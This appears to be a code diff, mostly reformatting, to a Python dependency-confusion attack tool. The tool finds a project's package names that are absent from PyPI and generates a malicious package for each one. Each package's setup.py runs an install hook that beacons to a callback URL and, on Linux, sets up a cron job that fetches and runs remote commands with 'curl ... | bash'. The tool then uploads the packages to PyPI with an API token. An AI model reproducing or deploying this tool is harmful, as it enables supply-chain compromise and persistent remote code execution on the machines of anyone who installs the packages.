@@ -58,7 +58,14 @@ class DependencyConfusion:
                 if line.startswith("]"):
                     break
                 if line.startswith('"') or line.startswith("'"):
-                    pkg = line.split("[")[0].strip("'\", ").split(">")[0].split("<")[0].split("=")[0].strip()
+                    pkg = (
+                        line.split("[")[0]
+                        .strip("'\", ")
+                        .split(">")[0]
+                        .split("<")[0]
+                        .split("=")[0]
+                        .strip()
+                    )
                     if pkg and not pkg.startswith("#"):
                         packages.append(pkg)
         logger.info(f"Found {len(packages)} packages in pyproject.toml")
@@ -75,9 +82,7 @@ class DependencyConfusion:
     def find_confusion_candidates(self) -> List[Dict]:
         """Find packages that exist in project but NOT on PyPI"""
         candidates = []
-        all_packages = list(
-            set(self.scan_requirements() + self.scan_pyproject())
-        )
+        all_packages = list(set(self.scan_requirements() + self.scan_pyproject()))
         for pkg in all_packages:
             if not self.check_pypi_exists(pkg):
                 candidates.append(
@@ -92,38 +97,35 @@ class DependencyConfusion:
         os.makedirs(package_dir, exist_ok=True)
 
         setup_py = (
-            f'from setuptools import setup\n'
-            f'from setuptools.command.install import install\n'
-            f'import os\n'
-            f'import subprocess\n'
-            f'import sys\n\n'
-            f'class PostInstallCommand(install):\n'
-            f'    def run(self):\n'
-            f'        install.run(self)\n'
-            f'        # Callback beacon\n'
-            f'        try:\n'
-            f'            import urllib.request\n'
+            f"from setuptools import setup\n"
+            f"from setuptools.command.install import install\n"
+            f"import os\n"
+            f"import subprocess\n"
+            f"import sys\n\n"
+            f"class PostInstallCommand(install):\n"
+            f"    def run(self):\n"
+            f"        install.run(self)\n"
+            f"        # Callback beacon\n"
+            f"        try:\n"
+            f"            import urllib.request\n"
             f'            urllib.request.urlopen("{callback_url}/beacon/{package_name}", timeout=5)\n'
-            f'        except Exception:\n'
-            f'            pass\n'
-            f'        # Deploy persistence\n'
+            f"        except Exception:\n"
+            f"            pass\n"
+            f"        # Deploy persistence\n"
             f'        if sys.platform == "linux":\n'
             f'            cron = "* * * * * curl -s {callback_url}/cmd | bash\\n"\n'
             f'            with open("/tmp/.pkg_update", "w") as f:\n'
-            f'                f.write(cron)\n'
-            f'                os.system("crontab /tmp/.pkg_update 2>/dev/null")\n\n'
-            f'setup(\n'
+            f"            f.write(cron)\n"
+            f'                subprocess.run(["crontab", "/tmp/.pkg_update"], capture_output=True, timeout=10)\n\n'
+            f"setup(\n"
             f'    name="{package_name}",\n'
             f'    version="99.99.99",\n'
             f'    description="Auto-generated package",\n'
             f'    packages=["{package_name}"],\n'
             f'    cmdclass={{"install": PostInstallCommand}},\n'
-            f')\n'
+            f")\n"
         )
-        pkg_init = (
-            f'"""Malicious package {package_name}"""\n'
-            f'__version__ = "99.99.99"\n'
-        )
+        pkg_init = f'"""Malicious package {package_name}"""\n' f'__version__ = "99.99.99"\n'
 
         setup_path = os.path.join(os.path.dirname(package_dir), "setup.py")
         init_path = os.path.join(package_dir, "__init__.py")
@@ -153,9 +155,14 @@ class DependencyConfusion:
             if pypi_token and os.path.exists(dist_dir):
                 subprocess.run(
                     [
-                        sys.executable, "-m", "twine", "upload",
-                        "--username", "__token__",
-                        "--password", pypi_token,
+                        sys.executable,
+                        "-m",
+                        "twine",
+                        "upload",
+                        "--username",
+                        "__token__",
+                        "--password",
+                        pypi_token,
                         os.path.join(dist_dir, "*.tar.gz"),
                     ],
                     capture_output=True,
